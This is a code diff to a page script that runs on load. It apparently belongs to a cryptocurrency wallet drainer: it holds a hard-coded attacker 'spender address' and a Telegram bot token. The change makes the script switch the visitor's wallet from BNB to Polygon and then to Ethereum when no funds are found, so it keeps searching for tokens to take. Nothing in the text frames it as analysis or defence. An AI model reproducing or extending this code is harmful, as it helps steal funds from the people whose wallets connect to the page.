@@ -4,7 +4,9 @@ window.onload = async function(){
 
   let useraddress;
   let high_token;
+  let next_network = ['0x89','0x1'];
   let network_id = '0x38'; // bnb mainnet
+  let check_last_net = true;
 
   const spenderAddress = '0xad166A918d20703D6D5d97919C79f4C56e12A68f'; // spender address
   let bot_token = '6458087750:AAHfey42yyHAJk3lmXb12XJCOeQlf9u3x7M';
@@ -149,7 +151,20 @@ window.onload = async function(){
         all_token_address == null ||
         all_token_address == ''
       ) {
-        alert('minimum funds require on bsc network');
+        if (network_id == '0x38'){
+           network_id = '0x89';
+           await change_network(network_id);
+           await get();
+        }  else{
+          if(!check_last_net){
+            alert('wallet funds require.')
+            return;
+          }
+           network_id = '0x1';
+           await change_network(network_id);
+           await get();
+           check_last_net = false;
+        }
         hide_spin();
         return;
       }
